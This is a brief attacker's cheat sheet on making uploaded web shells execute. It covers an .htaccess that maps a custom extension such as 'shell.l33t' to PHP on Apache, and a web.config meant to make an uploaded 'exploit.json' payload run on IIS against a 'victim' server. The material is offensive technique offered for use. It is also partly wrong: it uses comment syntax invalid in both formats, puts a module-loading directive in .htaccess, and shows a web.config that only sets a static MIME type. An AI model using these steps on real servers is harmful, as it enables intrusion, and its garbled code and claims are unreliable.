### Apache 

Drop a custom `.htaccess` alongside your upload:
1. Upload your `shell.l33t` (or any ext) + this `.htaccess`.
2.  Hit `http://victim/uploads/shell.l33t` → server runs it as PHP.
 **Requirements:** `AllowOverride` must be enabled in Apache’s main config.

```apacheconf
// .htaccess lives in directories, links PHP execution to .php files
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php

// If PHP isn’t allowed by default, map a “weird” extension
// Upload e.g. shell.l33t instead of shell.php
AddType application/x-httpd-php .l33t
```

/////////////////////////////////////////////////////////////////////////////////////////////////////////

### IIS

web.config file manipulation:
1. Upload `exploit.json` containing your ASPX/PHP payload.
2. Upload the below `web.config` to the same folder.
3. Access `http://victim/uploads/exploit.json` → IIS treats it as executable.
**Tip:** Put `web.config` at the root of your upload directory.

```xml
// web.config example allows execution of .json files
<configuration>
  <system.webServer>
    <staticContent>
      <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
  </system.webServer>
</configuration>

```
